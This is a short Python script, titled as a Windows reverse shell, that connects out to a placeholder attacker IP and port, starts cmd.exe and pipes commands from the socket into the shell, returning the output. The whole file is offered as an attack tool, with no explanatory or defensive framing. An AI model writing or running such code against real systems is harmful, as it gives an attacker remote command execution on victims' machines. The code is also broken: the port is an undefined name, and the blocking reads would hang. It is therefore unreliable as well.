# reverse shell for Windows
import socket
import subprocess

HOST = 'your_attacker_ip' # change to your attacker IP
PORT = your_attacker_port # change to your desired port number

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# start a new shell
process = subprocess.Popen(['cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

# start sending and receiving data
while True:
    data = s.recv(1024)
    if len(data) == 0:
        break
    process.stdin.write(data)
    process.stdin.flush()
    result = process.stdout.read() + process.stderr.read()
    s.send(result)

s.close()
